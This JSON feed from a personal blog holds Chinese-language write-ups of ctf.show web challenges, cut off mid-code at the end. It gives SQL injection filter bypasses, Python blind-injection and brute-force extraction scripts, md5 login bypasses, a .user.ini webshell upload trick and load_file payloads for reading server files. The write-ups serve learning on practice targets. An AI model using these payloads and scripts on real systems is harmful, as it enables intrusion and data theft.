{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345 • All posts by \"web\" tag",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.cn",
    "items": [
        {
            "id": "http://dpm12345.cn/posts/96bab31d/",
            "url": "http://dpm12345.cn/posts/96bab31d/",
            "title": "Web_other",
            "date_published": "2022-10-04T03:43:10.000Z",
            "content_html": "<h1 id=\"web-4\"><a class=\"anchor\" href=\"#web-4\">#</a> web 4</h1>\n<p>日志文件   蚁剑</p>\n<h1 id=\"web-5\"><a class=\"anchor\" href=\"#web-5\">#</a> web 5</h1>\n<p><strong>开头 0e 的 md5</strong></p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>QNKCDZO：0e830400451993494058024219903391 </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>240610708：0e462097431906509019562988736854 </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>s878926199a 0e545993274517709034328855841020 </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s155964671a 0e342768416822451524974117254469 </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s214587387a 0e848240448830537924465865611904 </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>s1091221200a 0e940624217856561557816327384675 </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>s1885207154a 0e509367213418206700842008763514 </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>s1502113478a 0e861580163291561247404381396064 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>s1836677006a 0e481036490867661113260034900752 </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>s1184209335a 0e072485820392773389523109082030 </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>s1665632922a 0e731198061491163073197128363787 </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>s532378020a 0e220463095855511507588041205815</pre></td></tr></tbody></table></figure><h1 id=\"web-6\"><a class=\"anchor\" href=\"#web-6\">#</a> web 6</h1>\n<p>输入万能密码，显示 <code>sql injection error</code></p>\n<p>猜测空格过滤，绕过，发现能正常回显，之后便是正常爆库、表、字段了</p>\n<h1 id=\"web-7\"><a class=\"anchor\" href=\"#web-7\">#</a> web 7</h1>\n<p>同样的也是空格过滤</p>\n<p>在输入时同时也发现对单引号  <code>'</code>  的滤</p>\n<h1 id=\"web-8\"><a class=\"anchor\" href=\"#web-8\">#</a> web 8</h1>\n<p>首先确认该题为数字型注入 同样也是过滤了空格，之后可发现过滤了逗号，那么联合查询不能使用了，可以采用布尔盲注 下面是逗号的绕过方法</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>' and ascii (substr ((select database ()),1,1))=xx #</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>这样的话写个脚本很容易跑出来了，过滤逗号之后可以变成这样</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>' and ascii (substr ((select database ()) from 1 for 1))=xx #</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>这应该是 substring 函数的两种用法</pre></td></tr></tbody></table></figure><p>使用如下程序爆库</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>s <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>table <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://41ca0d79-9b41-4a09-b5e6-a5d1fe2a3a03.challenge.ctf.show/index.php'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#估计查询到的字段长度</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#从可读取的 ascii 码开始到结束</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\"># 爆表名</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token comment\">#爆字段名 flag</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">#payload = \"ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#\"%(str(i),str(j))</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#读取 flag</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload = \"ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#\"%(str(i), str(j))</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        re <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url <span class=\"token operator\">+</span> <span class=\"token string\">'?id=0/**/or/**/'</span> <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'I asked nothing'</span> <span class=\"token keyword\">in</span> re<span class=\"token punctuation\">:</span>  <span class=\"token comment\">#是否成功   </span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            table <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></tbody></table></figure><p>得到 flag</p>\n<h1 id=\"web-9\"><a class=\"anchor\" href=\"#web-9\">#</a> web 9</h1>\n<p>访问  <code>/robots.txt</code>  可以知道源码文件</p>\n<p>下载得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"password error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"select * from user where username ='admin' and password ='\"</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t\t\t\t <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"登陆成功&lt;br&gt;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t\t\t\t <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t\t\t <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p><code>$sql=\"select * from user where username ='admin' and password ='\".md5($password,true).\"'\";</code></p>\n<p>其中</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/3544233-69332a9de6e8291b.png\" alt=\"\"></p>\n<p>由此如果想要绕过，那么应该使得 <code>password</code>  转换成 16 进制的 hex 值以后，再将其转换成字符串后包含 <code>' 'or ' 6'&lt;trash&gt;</code></p>\n<p>有一个字符串为  <code>ffifdyop</code> , 经过上述操作满足该条件</p>\n<p>构成 <code>SELECT * FROM admin WHERE pass=' 'or ' 6'&lt;trash&gt;</code></p>\n<p>就可以注入了</p>\n<h1 id=\"web-10\"><a class=\"anchor\" href=\"#web-10\">#</a> web 10</h1>\n<p>这里介绍两个 mysql 语句</p>\n<ol>\n<li>\n<p>group by（将结果集中的数据行根据选择列的值进行逻辑分组） 不加 group by 时的输出如下</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/20200217171754632.png\" alt=\"\"></p>\n<p>在使用 group by 以后会按照 password 中的值进行排列</p>\n</li>\n<li>\n<p>with rollup（group by 后可以跟 with rollup，表示在进行分组统计的基础上再次进行汇总统计） 来看实例</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/20200217171715827.png\" alt=\"\"></p>\n<p>结果中将会多出一行，其中 <code>password</code>  列为 null， <code>count（*)</code>  为统计和。</p>\n</li>\n</ol>\n<p>这里我们就可以通过骚姿势绕过了。</p>\n<p>其中  <code>/**/</code>  是为了绕过空格过滤</p>\n<p><code>payload:username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</code></p>\n<p>因为加入 with rollup 后 password 有一行为 NULL，我们只要输入空密码使得 <code>(NULL==NULL)</code>  即可满足 <code>$password==$row['password']</code>  的限制成功登陆</p>\n<p>登录成功即可显示 flag</p>\n<h1 id=\"web-11\"><a class=\"anchor\" href=\"#web-11\">#</a> web 11</h1>\n<p>看代码</p>\n<p>要使 password=$_SESSION ['password']</p>\n<p>而 session 在 cookie 里，根据提示，那么删掉 cookie 后提交空密码即可</p>\n<h1 id=\"web-12\"><a class=\"anchor\" href=\"#web-12\">#</a> web 12</h1>\n<p>查看源码，有注释 <code>hit:?cmd=</code> ，题目 hint 为 glob 绕过</p>\n<p>查找相关函数后，payload： <code>?cmd=print_r(glob(\"*.php\"));</code>  或 <code>print_r(scandir(\".\"));</code></p>\n<p>得到一个 php 文件名，再使用提示的 highlight 查看源码</p>\n<p>得到 flag</p>\n<h1 id=\"web-13\"><a class=\"anchor\" href=\"#web-13\">#</a> web 13</h1>\n<p>文件上传</p>\n<p>访问  <code>upload.php.bak </code> 下载源码</p>\n<p>知道做了很多限制，php 不能上传，文件内容不超过 24, 文件名小于 9，文件后缀不大于 3</p>\n<p>这里用到了上传 <code>.user.ini</code>  绕过黑名单</p>\n<p><strong>原理：</strong>  <code>PHP_INI_PREDIR</code>  模式的配置也可以在 <code>.user.ini</code>  文件中进行配置</p>\n<p>在 <code>PHP_INI_PERDIR</code>  模式中存在两个特殊的配置： <code>auto_append_file</code> 、 <code>auto_prepend_file</code> 。</p>\n<p><code>auto_prepend_file</code>  配置的作用为指定一个文件在主文件解析前解析， <code>auto_append_file</code>  的作用为指定一个文件在主文件解析后解析 因此可上传一个 <code>1.txt</code> ，内容为一句话木马 然后再上传包 <code>auto_prepend_file=1.txt</code>  的 <code>user.ini</code>  文件</p>\n<p>之后 payload： <code>http://14b1f783-83bc-4d8d-88dd-2c51ed6f4d05.challenge.ctf.show/?a=print_r(glob('*'));</code></p>\n<p>访问目录得到所有文件名，得到一个 php 文件名</p>\n<p>用 <code>highlight</code>  访问得到 flag</p>\n<h1 id=\"web-14\"><a class=\"anchor\" href=\"#web-14\">#</a> web 14</h1>\n<p>首先是一个 <code>switch</code>  语句</p>\n<p>观察代码，明显是要输出 url 的内容，那么必然要进入带有双引号的语句</p>\n<p>根据 <code>switch</code>  语句的特性，可以输入 <code>c=3</code> , 输出 url</p>\n<p>访问得到的路径，发现是一个数据库查询页面，回显为 <code>alert</code></p>\n<p>尝试 <code>1</code> ，返回 <code>admin，2</code> ，返回另一个，输入 <code>1 or 1=1</code> ，无反应，改为 <code>1/**/or/**/1=1</code> ，正常回显</p>\n<p>于是清楚注入方式和空格过滤</p>\n<p>查看源码也可知 <code>information_schema.tables</code>  和 <code>information_schema.columns</code>  被过滤 这里采用反引号过滤即 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi><mi>n</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>m</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><msub><mi>n</mi><mi>s</mi></msub><mi>c</mi><mi>h</mi><mi>e</mi><mi>m</mi><mi>a</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">‘</mi><mi>t</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi>s</mi><mi mathvariant=\"normal\">‘</mi></mrow><annotation encoding=\"application/x-tex\">information_schema.`tables`</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">o</span><span class=\"mord\"><span class=\"mord mathnormal\">n</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">a</span><span class=\"mord\">.</span><span class=\"mord\">‘</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">‘</span></span></span></span></p>\n<p>之后爆出库名，表名，字段 最后查询字段值时，返回 <code>1adminflag is not here!,2gtf1ywow,you can really dance,3Wowtell you a secret,secret has a secret...</code></p>\n<p>也就是说 flag 可能在 <code>secret.php</code>  文件中 使用 MySQL 的 <code>load_file</code>  进行查询 访问默认目录 <code>/var/www/html/</code></p>\n<p><code>?query=0/**/union/**/select/**/load_file('/var/www/html/secret.php') </code></p>\n<p>查询后无回显，但查看源码，看到 alert 里面</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>&lt;?php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$url = 'here_1s_your_f1ag.php';</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>$file = '/tmp/gtf1y';</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>if(trim(@file_get_contents($file)) === 'ctf.show'){</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\techo file_get_contents('/real_flag_is_here');</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>}'</pre></td></tr></tbody></table></figure><p>也就是说 flag 可能在 <code>/real_flag_is_here</code>  里</p>\n<p>访问 <code>?query=0/**/union/**/select/**/load_file('/real_flag_is_here')</code></p>\n<p>无回显，但查看源码，同样在 alert 里，得到 flag</p>\n<h1 id=\"红包题第七弹\"><a class=\"anchor\" href=\"#红包题第七弹\">#</a> 红包题第七弹</h1>\n<p>页面显示 phpinfo () 的回显</p>\n<p>不知道咋做，网上搜索</p>\n<p>首先 wegt 下载 index，发现有后面文件，但无法访问</p>\n<p>shell 为 Letmein，使用蚁剑连接</p>\n<p>发现 flag.txt, 但点进去后没有内容，但 flag 是占用空间的</p>\n<p>那么回到网页，POST 传入 <code>Letmein=highlight_file ('/var/www/flag.txt');</code></p>\n<h1 id=\"ctfshow-web1\"><a class=\"anchor\" href=\"#ctfshow-web1\">#</a> CTFshow web1</h1>\n<p>爆破</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>url<span class=\"token operator\">=</span><span class=\"token string\">\"http://e9258400-1724-487b-b58e-e28eab62e8cc.challenge.ctf.show/\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url1<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"/reg.php\"</span> <span class=\"token comment\">#注册页面</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url2<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"/login.php\"</span><span class=\"token comment\">#登录界面</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>url3<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"/user_main.php?order=pwd\"</span> <span class=\"token comment\">#查询界面</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>k<span class=\"token operator\">=</span><span class=\"token string\">\"ctfshow{\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>s<span class=\"token operator\">=</span><span class=\"token string\">\"-.0123456789:abcdefghijklmnopqrstuvwxyz{|}~\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        l<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        l<span class=\"token operator\">=</span>k<span class=\"token operator\">+</span>i</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        l2 <span class=\"token operator\">=</span> k<span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span>l<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                    <span class=\"token string\">'email'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                    <span class=\"token string\">'nickname'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                    <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span>l</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        data2<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span>l<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                      <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span>l</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>l<span class=\"token operator\">==</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            k<span class=\"token operator\">=</span><span class=\"token string\">'flag'</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        session <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        r1 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url1<span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        r2 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url2<span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        r3 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        t <span class=\"token operator\">=</span> r3<span class=\"token punctuation\">.</span>text</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;td&gt;\"</span><span class=\"token operator\">+</span>l<span class=\"token operator\">+</span><span class=\"token string\">\"&lt;/td&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span>t<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;td&gt;flag@ctf.show&lt;/td&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            k<span class=\"token operator\">=</span>l2</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></tbody></table></figure><h1 id=\"红包题第二弹\"><a class=\"anchor\" href=\"#红包题第二弹\">#</a> 红包题第二弹</h1>\n<p>查看源码，获得注释 <code>?cmd</code> ，修改网址，得到代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#error_reporting(0);</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>zh-CN<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Content-Type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html; charset=UTF-8<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>ctf.show_红包题<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td 